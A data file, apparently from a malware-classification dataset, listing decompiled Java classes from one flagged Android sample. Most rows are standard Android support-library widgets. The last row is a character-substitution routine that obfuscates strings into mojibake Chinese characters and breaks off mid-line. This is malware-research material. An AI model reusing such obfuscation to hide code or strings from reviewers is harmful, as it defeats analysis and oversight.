"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\CursorAdapter.code","public abstract class CursorAdapter extends BaseAdapter implements Filterable, CursorFilter.CursorFilterClient {   @Deprecated public static final int FLAG_AUTO_REQUERY=1;   public static final int FLAG_REGISTER_CONTENT_OBSERVER=2;   protected boolean mAutoRequery;   protected ChangeObserver mChangeObserver;   protected Context mContext;   protected Cursor mCursor;   protected CursorFilter mCursorFilter;   protected DataSetObserver mDataSetObserver;   protected boolean mDataValid;   protected FilterQueryProvider mFilterQueryProvider;   protected int mRowIDColumn;   public abstract void bindView(  View view,  Context context,  Cursor cursor);   public abstract View newView(  Context context,  Cursor cursor,  ViewGroup viewGroup);   @Deprecated public CursorAdapter(  Context context,  Cursor c){     init(context,c,1);   }   public CursorAdapter(  Context context,  Cursor c,  boolean autoRequery){     init(context,c,autoRequery ? 1 : 2);   }   public CursorAdapter(  Context context,  Cursor c,  int flags){     init(context,c,flags);   }   @Deprecated protected void init(  Context context,  Cursor c,  boolean autoRequery){     init(context,c,autoRequery ? 1 : 2);   }   void init(  Context context,  Cursor c,  int flags){     if ((flags & 1) == 1) {       flags|=2;       this.mAutoRequery=true;     }  else {       this.mAutoRequery=false;     }     boolean cursorPresent=c != null;     this.mCursor=c;     this.mDataValid=cursorPresent;     this.mContext=context;     this.mRowIDColumn=cursorPresent ? c.getColumnIndexOrThrow(""_id"") : -1;     if ((flags & 2) == 2) {       this.mChangeObserver=new ChangeObserver();       this.mDataSetObserver=new MyDataSetObserver();     }  else {       this.mChangeObserver=null;       this.mDataSetObserver=null;     }     if (cursorPresent) {       if (this.mChangeObserver != null) {         c.registerContentObserver(this.mChangeObserver);       }       if (this.mDataSetObserver != null) {         c.registerDataSetObserver(this.mDataSetObserver);       }     }   }   @Override public Cursor getCursor(){     return this.mCursor;   }   @Override public int getCount(){     if (!this.mDataValid || this.mCursor == null) {       return 0;     }     return this.mCursor.getCount();   }   @Override public Object getItem(  int position){     if (!this.mDataValid || this.mCursor == null) {       return null;     }     this.mCursor.moveToPosition(position);     return this.mCursor;   }   @Override public long getItemId(  int position){     if (this.mDataValid && this.mCursor != null && this.mCursor.moveToPosition(position)) {       return this.mCursor.getLong(this.mRowIDColumn);     }     return 0L;   }   @Override public boolean hasStableIds(){     return true;   }   @Override public View getView(  int position,  View convertView,  ViewGroup parent){     View v;     if (!this.mDataValid) {       throw new IllegalStateException(""this should only be called when the cursor is valid"");     }     if (!this.mCursor.moveToPosition(position)) {       throw new IllegalStateException(""couldn't move cursor to position "" + position);     }     if (convertView == null) {       v=newView(this.mContext,this.mCursor,parent);     }  else {       v=convertView;     }     bindView(v,this.mContext,this.mCursor);     return v;   }   @Override public View getDropDownView(  int position,  View convertView,  ViewGroup parent){     View v;     if (this.mDataValid) {       this.mCursor.moveToPosition(position);       if (convertView == null) {         v=newDropDownView(this.mContext,this.mCursor,parent);       }  else {         v=convertView;       }       bindView(v,this.mContext,this.mCursor);       return v;     }     return null;   }   public View newDropDownView(  Context context,  Cursor cursor,  ViewGroup parent){     return newView(context,cursor,parent);   }   @Override public void changeCursor(  Cursor cursor){     Cursor old=swapCursor(cursor);     if (old != null) {       old.close();     }   }   public Cursor swapCursor(  Cursor newCursor){     if (newCursor == this.mCursor) {       return null;     }     Cursor oldCursor=this.mCursor;     if (oldCursor != null) {       if (this.mChangeObserver != null) {         oldCursor.unregisterContentObserver(this.mChangeObserver);       }       if (this.mDataSetObserver != null) {         oldCursor.unregisterDataSetObserver(this.mDataSetObserver);       }     }     this.mCursor=newCursor;     if (newCursor != null) {       if (this.mChangeObserver != null) {         newCursor.registerContentObserver(this.mChangeObserver);       }       if (this.mDataSetObserver != null) {         newCursor.registerDataSetObserver(this.mDataSetObserver);       }       this.mRowIDColumn=newCursor.getColumnIndexOrThrow(""_id"");       this.mDataValid=true;       notifyDataSetChanged();       return oldCursor;     }     this.mRowIDColumn=-1;     this.mDataValid=false;     notifyDataSetInvalidated();     return oldCursor;   }   @Override public CharSequence convertToString(  Cursor cursor){     return cursor == null ? """" : cursor.toString();   }   @Override public Cursor runQueryOnBackgroundThread(  CharSequence constraint){     return this.mFilterQueryProvider != null ? this.mFilterQueryProvider.runQuery(constraint) : this.mCursor;   }   @Override public Filter getFilter(){     if (this.mCursorFilter == null) {       this.mCursorFilter=new CursorFilter(this);     }     return this.mCursorFilter;   }   public FilterQueryProvider getFilterQueryProvider(){     return this.mFilterQueryProvider;   }   public void setFilterQueryProvider(  FilterQueryProvider filterQueryProvider){     this.mFilterQueryProvider=filterQueryProvider;   }   protected void onContentChanged(){     if (this.mAutoRequery && this.mCursor != null && !this.mCursor.isClosed()) {       this.mDataValid=this.mCursor.requery();     }   } public class ChangeObserver extends ContentObserver {     public ChangeObserver(){       super(new Handler());     }     @Override public boolean deliverSelfNotifications(){       return true;     }     @Override public void onChange(    boolean selfChange){       CursorAdapter.this.onContentChanged();     }   } public class MyDataSetObserver extends DataSetObserver {     private MyDataSetObserver(){     }     @Override public void onChanged(){       CursorAdapter.this.mDataValid=true;       CursorAdapter.this.notifyDataSetChanged();     }     @Override public void onInvalidated(){       CursorAdapter.this.mDataValid=false;       CursorAdapter.this.notifyDataSetInvalidated();     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\CursorFilter.code","class CursorFilter extends Filter {   CursorFilterClient mClient; interface CursorFilterClient {     void changeCursor(    Cursor cursor);     CharSequence convertToString(    Cursor cursor);     Cursor getCursor();     Cursor runQueryOnBackgroundThread(    CharSequence charSequence);   }   public CursorFilter(  CursorFilterClient client){     this.mClient=client;   }   @Override public CharSequence convertResultToString(  Object resultValue){     return this.mClient.convertToString((Cursor)resultValue);   }   @Override protected Filter.FilterResults performFiltering(  CharSequence constraint){     Cursor cursor=this.mClient.runQueryOnBackgroundThread(constraint);     Filter.FilterResults results=new Filter.FilterResults();     if (cursor != null) {       results.count=cursor.getCount();       results.values=cursor;     }  else {       results.count=0;       results.values=null;     }     return results;   }   @Override protected void publishResults(  CharSequence constraint,  Filter.FilterResults results){     Cursor oldCursor=this.mClient.getCursor();     if (results.values != null && results.values != oldCursor) {       this.mClient.changeCursor((Cursor)results.values);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\CursorFilterClient.code","interface CursorFilterClient {   void changeCursor(  Cursor cursor);   CharSequence convertToString(  Cursor cursor);   Cursor getCursor();   Cursor runQueryOnBackgroundThread(  CharSequence charSequence); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\CursorToStringConverter.code","public interface CursorToStringConverter {   CharSequence convertToString(  Cursor cursor); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\EdgeEffectCompat.code","public class EdgeEffectCompat {   private static final EdgeEffectImpl IMPL;   private Object mEdgeEffect; interface EdgeEffectImpl {     boolean draw(    Object obj,    Canvas canvas);     void finish(    Object obj);     boolean isFinished(    Object obj);     Object newEdgeEffect(    Context context);     boolean onAbsorb(    Object obj,    int i);     boolean onPull(    Object obj,    float f);     boolean onRelease(    Object obj);     void setSize(    Object obj,    int i,    int i2);   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new EdgeEffectIcsImpl();     }  else {       IMPL=new BaseEdgeEffectImpl();     }   } static class BaseEdgeEffectImpl implements EdgeEffectImpl {     BaseEdgeEffectImpl(){     }     @Override public Object newEdgeEffect(    Context context){       return null;     }     @Override public void setSize(    Object edgeEffect,    int width,    int height){     }     @Override public boolean isFinished(    Object edgeEffect){       return true;     }     @Override public void finish(    Object edgeEffect){     }     @Override public boolean onPull(    Object edgeEffect,    float deltaDistance){       return false;     }     @Override public boolean onRelease(    Object edgeEffect){       return false;     }     @Override public boolean onAbsorb(    Object edgeEffect,    int velocity){       return false;     }     @Override public boolean draw(    Object edgeEffect,    Canvas canvas){       return false;     }   } static class EdgeEffectIcsImpl implements EdgeEffectImpl {     EdgeEffectIcsImpl(){     }     @Override public Object newEdgeEffect(    Context context){       return EdgeEffectCompatIcs.newEdgeEffect(context);     }     @Override public void setSize(    Object edgeEffect,    int width,    int height){       EdgeEffectCompatIcs.setSize(edgeEffect,width,height);     }     @Override public boolean isFinished(    Object edgeEffect){       return EdgeEffectCompatIcs.isFinished(edgeEffect);     }     @Override public void finish(    Object edgeEffect){       EdgeEffectCompatIcs.finish(edgeEffect);     }     @Override public boolean onPull(    Object edgeEffect,    float deltaDistance){       return EdgeEffectCompatIcs.onPull(edgeEffect,deltaDistance);     }     @Override public boolean onRelease(    Object edgeEffect){       return EdgeEffectCompatIcs.onRelease(edgeEffect);     }     @Override public boolean onAbsorb(    Object edgeEffect,    int velocity){       return EdgeEffectCompatIcs.onAbsorb(edgeEffect,velocity);     }     @Override public boolean draw(    Object edgeEffect,    Canvas canvas){       return EdgeEffectCompatIcs.draw(edgeEffect,canvas);     }   }   public EdgeEffectCompat(  Context context){     this.mEdgeEffect=IMPL.newEdgeEffect(context);   }   public void setSize(  int width,  int height){     IMPL.setSize(this.mEdgeEffect,width,height);   }   public boolean isFinished(){     return IMPL.isFinished(this.mEdgeEffect);   }   public void finish(){     IMPL.finish(this.mEdgeEffect);   }   public boolean onPull(  float deltaDistance){     return IMPL.onPull(this.mEdgeEffect,deltaDistance);   }   public boolean onRelease(){     return IMPL.onRelease(this.mEdgeEffect);   }   public boolean onAbsorb(  int velocity){     return IMPL.onAbsorb(this.mEdgeEffect,velocity);   }   public boolean draw(  Canvas canvas){     return IMPL.draw(this.mEdgeEffect,canvas);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\EdgeEffectCompatIcs.code","class EdgeEffectCompatIcs {   EdgeEffectCompatIcs(){   }   public static Object newEdgeEffect(  Context context){     return new EdgeEffect(context);   }   public static void setSize(  Object edgeEffect,  int width,  int height){     ((EdgeEffect)edgeEffect).setSize(width,height);   }   public static boolean isFinished(  Object edgeEffect){     return ((EdgeEffect)edgeEffect).isFinished();   }   public static void finish(  Object edgeEffect){     ((EdgeEffect)edgeEffect).finish();   }   public static boolean onPull(  Object edgeEffect,  float deltaDistance){     ((EdgeEffect)edgeEffect).onPull(deltaDistance);     return true;   }   public static boolean onRelease(  Object edgeEffect){     EdgeEffect eff=(EdgeEffect)edgeEffect;     eff.onRelease();     return eff.isFinished();   }   public static boolean onAbsorb(  Object edgeEffect,  int velocity){     ((EdgeEffect)edgeEffect).onAbsorb(velocity);     return true;   }   public static boolean draw(  Object edgeEffect,  Canvas canvas){     return ((EdgeEffect)edgeEffect).draw(canvas);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\EdgeEffectIcsImpl.code","static class EdgeEffectIcsImpl implements EdgeEffectImpl {   EdgeEffectIcsImpl(){   }   @Override public Object newEdgeEffect(  Context context){     return EdgeEffectCompatIcs.newEdgeEffect(context);   }   @Override public void setSize(  Object edgeEffect,  int width,  int height){     EdgeEffectCompatIcs.setSize(edgeEffect,width,height);   }   @Override public boolean isFinished(  Object edgeEffect){     return EdgeEffectCompatIcs.isFinished(edgeEffect);   }   @Override public void finish(  Object edgeEffect){     EdgeEffectCompatIcs.finish(edgeEffect);   }   @Override public boolean onPull(  Object edgeEffect,  float deltaDistance){     return EdgeEffectCompatIcs.onPull(edgeEffect,deltaDistance);   }   @Override public boolean onRelease(  Object edgeEffect){     return EdgeEffectCompatIcs.onRelease(edgeEffect);   }   @Override public boolean onAbsorb(  Object edgeEffect,  int velocity){     return EdgeEffectCompatIcs.onAbsorb(edgeEffect,velocity);   }   @Override public boolean draw(  Object edgeEffect,  Canvas canvas){     return EdgeEffectCompatIcs.draw(edgeEffect,canvas);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\EdgeEffectImpl.code","interface EdgeEffectImpl {   boolean draw(  Object obj,  Canvas canvas);   void finish(  Object obj);   boolean isFinished(  Object obj);   Object newEdgeEffect(  Context context);   boolean onAbsorb(  Object obj,  int i);   boolean onPull(  Object obj,  float f);   boolean onRelease(  Object obj);   void setSize(  Object obj,  int i,  int i2); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\MyDataSetObserver.code","public class MyDataSetObserver extends DataSetObserver {   private MyDataSetObserver(){   }   @Override public void onChanged(){     CursorAdapter.this.mDataValid=true;     CursorAdapter.this.notifyDataSetChanged();   }   @Override public void onInvalidated(){     CursorAdapter.this.mDataValid=false;     CursorAdapter.this.notifyDataSetInvalidated();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\OnQueryTextListenerCompat.code","public static abstract class OnQueryTextListenerCompat {   final Object mListener=SearchViewCompat.IMPL.newOnQueryTextListener(this);   public boolean onQueryTextSubmit(  String query){     return false;   }   public boolean onQueryTextChange(  String newText){     return false;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\OnQueryTextListenerCompatBridge.code","interface OnQueryTextListenerCompatBridge {   boolean onQueryTextChange(  String str);   boolean onQueryTextSubmit(  String str); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\ResourceCursorAdapter.code","public abstract class ResourceCursorAdapter extends CursorAdapter {   private int mDropDownLayout;   private LayoutInflater mInflater;   private int mLayout;   @Deprecated public ResourceCursorAdapter(  Context context,  int layout,  Cursor c){     super(context,c);     this.mDropDownLayout=layout;     this.mLayout=layout;     this.mInflater=(LayoutInflater)context.getSystemService(""layout_inflater"");   }   public ResourceCursorAdapter(  Context context,  int layout,  Cursor c,  boolean autoRequery){     super(context,c,autoRequery);     this.mDropDownLayout=layout;     this.mLayout=layout;     this.mInflater=(LayoutInflater)context.getSystemService(""layout_inflater"");   }   public ResourceCursorAdapter(  Context context,  int layout,  Cursor c,  int flags){     super(context,c,flags);     this.mDropDownLayout=layout;     this.mLayout=layout;     this.mInflater=(LayoutInflater)context.getSystemService(""layout_inflater"");   }   @Override public View newView(  Context context,  Cursor cursor,  ViewGroup parent){     return this.mInflater.inflate(this.mLayout,parent,false);   }   @Override public View newDropDownView(  Context context,  Cursor cursor,  ViewGroup parent){     return this.mInflater.inflate(this.mDropDownLayout,parent,false);   }   public void setViewResource(  int layout){     this.mLayout=layout;   }   public void setDropDownViewResource(  int dropDownLayout){     this.mDropDownLayout=dropDownLayout;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\ScrollerCompat.code","class ScrollerCompat {   Scroller mScroller; static class ScrollerCompatImplIcs extends ScrollerCompat {     public ScrollerCompatImplIcs(    Context context){       super(context);     }     @Override public float getCurrVelocity(){       return ScrollerCompatIcs.getCurrVelocity(this.mScroller);     }   }   public static ScrollerCompat from(  Context context){     return Build.VERSION.SDK_INT >= 14 ? new ScrollerCompatImplIcs(context) : new ScrollerCompat(context);   }   ScrollerCompat(  Context context){     this.mScroller=new Scroller(context);   }   public boolean isFinished(){     return this.mScroller.isFinished();   }   public int getDuration(){     return this.mScroller.getDuration();   }   public int getCurrX(){     return this.mScroller.getCurrX();   }   public int getCurrY(){     return this.mScroller.getCurrY();   }   public float getCurrVelocity(){     return 0.0f;   }   public boolean computeScrollOffset(){     return this.mScroller.computeScrollOffset();   }   public void startScroll(  int startX,  int startY,  int dx,  int dy){     this.mScroller.startScroll(startX,startY,dx,dy);   }   public void startScroll(  int startX,  int startY,  int dx,  int dy,  int duration){     this.mScroller.startScroll(startX,startY,dx,dy,duration);   }   public void fling(  int startX,  int startY,  int velocityX,  int velocityY,  int minX,  int maxX,  int minY,  int maxY){     this.mScroller.fling(startX,startY,velocityX,velocityY,minX,maxX,minY,maxY);   }   public void abortAnimation(){     this.mScroller.abortAnimation();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\ScrollerCompatIcs.code","class ScrollerCompatIcs {   ScrollerCompatIcs(){   }   public static float getCurrVelocity(  Scroller scroller){     return scroller.getCurrVelocity();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\ScrollerCompatImplIcs.code","static class ScrollerCompatImplIcs extends ScrollerCompat {   public ScrollerCompatImplIcs(  Context context){     super(context);   }   @Override public float getCurrVelocity(){     return ScrollerCompatIcs.getCurrVelocity(this.mScroller);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\SearchViewCompat.code","public class SearchViewCompat {   private static final SearchViewCompatImpl IMPL; interface SearchViewCompatImpl {     Object newOnQueryTextListener(    OnQueryTextListenerCompat onQueryTextListenerCompat);     View newSearchView(    Context context);     void setOnQueryTextListener(    Object obj,    Object obj2);   } static class SearchViewCompatStubImpl implements SearchViewCompatImpl {     SearchViewCompatStubImpl(){     }     @Override public View newSearchView(    Context context){       return null;     }     @Override public Object newOnQueryTextListener(    OnQueryTextListenerCompat listener){       return null;     }     @Override public void setOnQueryTextListener(    Object searchView,    Object listener){     }   } static class SearchViewCompatHoneycombImpl extends SearchViewCompatStubImpl {     SearchViewCompatHoneycombImpl(){     }     @Override public View newSearchView(    Context context){       return SearchViewCompatHoneycomb.newSearchView(context);     }     @Override public Object newOnQueryTextListener(    final OnQueryTextListenerCompat listener){       return SearchViewCompatHoneycomb.newOnQueryTextListener(new SearchViewCompatHoneycomb.OnQueryTextListenerCompatBridge(){         @Override public boolean onQueryTextSubmit(        String query){           return listener.onQueryTextSubmit(query);         }         @Override public boolean onQueryTextChange(        String newText){           return listener.onQueryTextChange(newText);         }       } );     }     @Override public void setOnQueryTextListener(    Object searchView,    Object listener){       SearchViewCompatHoneycomb.setOnQueryTextListener(searchView,listener);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new SearchViewCompatHoneycombImpl();     }  else {       IMPL=new SearchViewCompatStubImpl();     }   }   private SearchViewCompat(  Context context){   }   public static View newSearchView(  Context context){     return IMPL.newSearchView(context);   }   public static void setOnQueryTextListener(  View searchView,  OnQueryTextListenerCompat listener){     IMPL.setOnQueryTextListener(searchView,listener.mListener);   } public static abstract class OnQueryTextListenerCompat {     final Object mListener=SearchViewCompat.IMPL.newOnQueryTextListener(this);     public boolean onQueryTextSubmit(    String query){       return false;     }     public boolean onQueryTextChange(    String newText){       return false;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\SearchViewCompatHoneycomb.code","class SearchViewCompatHoneycomb { interface OnQueryTextListenerCompatBridge {     boolean onQueryTextChange(    String str);     boolean onQueryTextSubmit(    String str);   }   SearchViewCompatHoneycomb(){   }   public static View newSearchView(  Context context){     return new SearchView(context);   }   public static Object newOnQueryTextListener(  final OnQueryTextListenerCompatBridge listener){     return new SearchView.OnQueryTextListener(){       @Override public boolean onQueryTextSubmit(      String query){         return OnQueryTextListenerCompatBridge.this.onQueryTextSubmit(query);       }       @Override public boolean onQueryTextChange(      String newText){         return OnQueryTextListenerCompatBridge.this.onQueryTextChange(newText);       }     } ;   }   public static void setOnQueryTextListener(  Object searchView,  Object listener){     ((SearchView)searchView).setOnQueryTextListener((SearchView.OnQueryTextListener)listener);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\SearchViewCompatHoneycombImpl.code","static class SearchViewCompatHoneycombImpl extends SearchViewCompatStubImpl {   SearchViewCompatHoneycombImpl(){   }   @Override public View newSearchView(  Context context){     return SearchViewCompatHoneycomb.newSearchView(context);   }   @Override public Object newOnQueryTextListener(  final OnQueryTextListenerCompat listener){     return SearchViewCompatHoneycomb.newOnQueryTextListener(new SearchViewCompatHoneycomb.OnQueryTextListenerCompatBridge(){       @Override public boolean onQueryTextSubmit(      String query){         return listener.onQueryTextSubmit(query);       }       @Override public boolean onQueryTextChange(      String newText){         return listener.onQueryTextChange(newText);       }     } );   }   @Override public void setOnQueryTextListener(  Object searchView,  Object listener){     SearchViewCompatHoneycomb.setOnQueryTextListener(searchView,listener);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\SearchViewCompatImpl.code","interface SearchViewCompatImpl {   Object newOnQueryTextListener(  OnQueryTextListenerCompat onQueryTextListenerCompat);   View newSearchView(  Context context);   void setOnQueryTextListener(  Object obj,  Object obj2); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\SearchViewCompatStubImpl.code","static class SearchViewCompatStubImpl implements SearchViewCompatImpl {   SearchViewCompatStubImpl(){   }   @Override public View newSearchView(  Context context){     return null;   }   @Override public Object newOnQueryTextListener(  OnQueryTextListenerCompat listener){     return null;   }   @Override public void setOnQueryTextListener(  Object searchView,  Object listener){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\SimpleCursorAdapter.code","public class SimpleCursorAdapter extends ResourceCursorAdapter {   private CursorToStringConverter mCursorToStringConverter;   protected int[] mFrom;   String[] mOriginalFrom;   private int mStringConversionColumn;   protected int[] mTo;   private ViewBinder mViewBinder; public interface CursorToStringConverter {     CharSequence convertToString(    Cursor cursor);   } public interface ViewBinder {     boolean setViewValue(    View view,    Cursor cursor,    int i);   }   @Deprecated public SimpleCursorAdapter(  Context context,  int layout,  Cursor c,  String[] from,  int[] to){     super(context,layout,c);     this.mStringConversionColumn=-1;     this.mTo=to;     this.mOriginalFrom=from;     findColumns(from);   }   public SimpleCursorAdapter(  Context context,  int layout,  Cursor c,  String[] from,  int[] to,  int flags){     super(context,layout,c,flags);     this.mStringConversionColumn=-1;     this.mTo=to;     this.mOriginalFrom=from;     findColumns(from);   }   @Override public void bindView(  View view,  Context context,  Cursor cursor){     ViewBinder binder=this.mViewBinder;     int count=this.mTo.length;     int[] from=this.mFrom;     int[] to=this.mTo;     for (int i=0; i < count; i++) {       View v=view.findViewById(to[i]);       if (v != null) {         boolean bound=false;         if (binder != null) {           bound=binder.setViewValue(v,cursor,from[i]);         }         if (bound) {           continue;         }  else {           String text=cursor.getString(from[i]);           if (text == null) {             text="""";           }           if (v instanceof TextView) {             setViewText((TextView)v,text);           }  else           if (v instanceof ImageView) {             setViewImage((ImageView)v,text);           }  else {             throw new IllegalStateException(v.getClass().getName() + "" is not a  view that can be bounds by this SimpleCursorAdapter"");           }         }       }     }   }   public ViewBinder getViewBinder(){     return this.mViewBinder;   }   public void setViewBinder(  ViewBinder viewBinder){     this.mViewBinder=viewBinder;   }   public void setViewImage(  ImageView v,  String value){     try {       v.setImageResource(Integer.parseInt(value));     }  catch (    NumberFormatException e) {       v.setImageURI(Uri.parse(value));     }   }   public void setViewText(  TextView v,  String text){     v.setText(text);   }   public int getStringConversionColumn(){     return this.mStringConversionColumn;   }   public void setStringConversionColumn(  int stringConversionColumn){     this.mStringConversionColumn=stringConversionColumn;   }   public CursorToStringConverter getCursorToStringConverter(){     return this.mCursorToStringConverter;   }   public void setCursorToStringConverter(  CursorToStringConverter cursorToStringConverter){     this.mCursorToStringConverter=cursorToStringConverter;   }   @Override public CharSequence convertToString(  Cursor cursor){     if (this.mCursorToStringConverter != null) {       return this.mCursorToStringConverter.convertToString(cursor);     }     if (this.mStringConversionColumn > -1) {       return cursor.getString(this.mStringConversionColumn);     }     return super.convertToString(cursor);   }   private void findColumns(  String[] from){     if (this.mCursor != null) {       int count=from.length;       if (this.mFrom == null || this.mFrom.length != count) {         this.mFrom=new int[count];       }       for (int i=0; i < count; i++) {         this.mFrom[i]=this.mCursor.getColumnIndexOrThrow(from[i]);       }       return;     }     this.mFrom=null;   }   @Override public Cursor swapCursor(  Cursor c){     Cursor res=super.swapCursor(c);     findColumns(this.mOriginalFrom);     return res;   }   public void changeCursorAndColumns(  Cursor c,  String[] from,  int[] to){     this.mOriginalFrom=from;     this.mTo=to;     super.changeCursor(c);     findColumns(this.mOriginalFrom);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.support.v4.widget\ViewBinder.code","public interface ViewBinder {   boolean setViewValue(  View view,  Cursor cursor,  int i); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\android.Wei\A1Oper.code","public class A1Oper {   public static String encode(  String str){     try {       return str.replace(""1"",""*å•Š*"").replace(""2"",""*ç±³*"").replace(""3"",""*å¼„*"").replace(""4"",""*æ¯”*"").replace(""5"",""*è¢«*"").replace(""6"",""*æ›¾*"").replace(""7"",""*è¿‡*"").replace(""8"",""*å¤´*"").replace(""9"",""*æˆ‘*"").replace(""0"",""*è…Œ*"").replace(""q"",""*ç›¯*"").replace(""w"",""*è·Ÿ*"").replace(""e"",""*å¼º*"").replace(""r"",""*é†ƒ*"").replace(""t"",""*åˆš*"").replace(""y"",""*ä»˜*"").replace(""u"",""*æ‚¨*"").replace(""i"",""*æƒ…*"").replace(""o"",""*æ–‡*"").replace(""p"",""*è‹Š*"").replace(""a"",""*å¿�*"").replace(""s"",""*æ��*"").replace(""d"",""*ä»¥*"").replace(""f"",""*å�¦*"").replace(""g"",""*æ–¹*"").replace(""h"",""*å››*"").replace(""j"",""*æœ¬*"").replace(""k"",""*ç¾¤*"").replace(""l"",""*è§�*"").replace(""z"",""*æ’’*"").replace(""x"",""*è�£*"").replace(""c"",""*ç½—*"").replace(""v"",""*åš„*"").replace(""b"",""*æ³¡*"").replace(""n"",""*é•¿*"").replace(""m"",""*è¡Œ*"").replace("" "",""*é’±*"").replace(""ï¼�"",""*ä¸‡*"").replace(""@"",""*é¢�*"").replace(""#"",""*ç‘ž*"").replace(""ï¿¥"",""*å¤©*"").replace(""%"",""*è¦�*"").replace(""â€¦â€¦"",""*å™¢*"").replace(""ï¼ˆ"",""*é™ª*"").replace(""ï¼‰"",""*ä»½*"").replace(""â€”â€”"",""*æ³•*"").replace(""+"",""*åˆ°*"").replace(""ï½›"",""*è¿›*"").replace(""ï½�"",""*ç»™*"").replace(""ï¼š"",""*è´§*"").replace(""â€œ"",""*ä¹…*"").replace(""ã€Š"",""*å¿«*"").replace(""ã€‹"",""*æ�¥*"").replace(""ï¼Ÿ"",""*å�š*"").replace(""|"",""*å…ˆ*"").replace(""~"",""*æ­¤*"").replace(""ï¼›"",""*å�§*"").replace(""â€˜"",""*å‘¢*"").replace(""ï¼Œ"",""*æ�¶*"").replace(""ã€‚"",""*å‰�*"").replace(""ã€�"",""*æ— *"").replace(""!"",""*é¹…*"").replace(""$"",""*å¦‚*"").replace(""^"",""*å›¾*"").replace(""&"",""*å‘€*"").replace(""("",""*å–”*"").replace("")"",""*ç›˜*"").replace(""_"",""*é”•*"").replace(""="",""*ç�¡*"").replace(""-"",""*ç­‰*"").replace(""]"",""*åˆ†*"").replace(""["",""*æ�ž*"").replace(""{"",""*æ´»*"").replace(""}"",""*å®¶*"").replace(""\\"",""*å�¯*"").replace(""\"""",""*ä¸¤*"").replace("":"",""*ä¸­*"").replace("";"",""*æ˜Ÿ*"").replace(""<"",""*å†²*"").replace("">"",""*è¾¹*"").replace(""?"",""*å¹´*"").replace("","",""*å��*"").replace(""."",""*æœŸ*"").replace(""/"",""*æŒ–*"");     }  catch (    Exception e) {       return str;     }   }   public static String decode(  String str){     try {       return str.replace(""*å•Š*"",""1"").replace(""*ç±³*"",""2"").replace(""*å¼„*"",""3"").replace(""*æ¯”*"",""4"").replace(""*è¢«*"",""5"").replace(""*æ›¾*"",""6"").replace(""*è¿‡*"",""7"").replace(""*å¤´*"",""8"").replace(""*æˆ‘*"",""9"").replace(""*è…Œ*"",""0"").replace(""*ç›¯*"",""q"").replace(""*è·Ÿ*"",""w"").replace(""*å¼º*"",""e"").replace(""*é†ƒ*"",""r"").replace(""*åˆš*"",""t"").replace(""*ä»˜*"",""y"").replace(""*æ‚¨*"",""u"").replace(""*æƒ…*"",""i"").replace(""*æ–‡*"",""o"").replace(""*è‹Š*"",""p"").replace(""*å¿�*"",""a"").replace(""*æ��*"",""s"").replace(""*ä»¥*"",""d"").replace(""*å�¦*"",""f"").replace(""*æ–¹*"",""g"").replace(""*å››*"",""h"").replace(""*æœ¬*"",""j"").replace(""*ç¾¤*"",""k"").replace(""*è§�*"",""l"").replace(""*æ’’*"",""z"").replace(""*è�£*"",""x"").replace(""*ç½—*"",""c"").replace(""*åš„*"",""v"").replace(""*æ³¡*"",""b"").replace(""*é•¿*"",""n"").replace(""*è¡Œ*"",""m"").replace(""*é’±*"","" 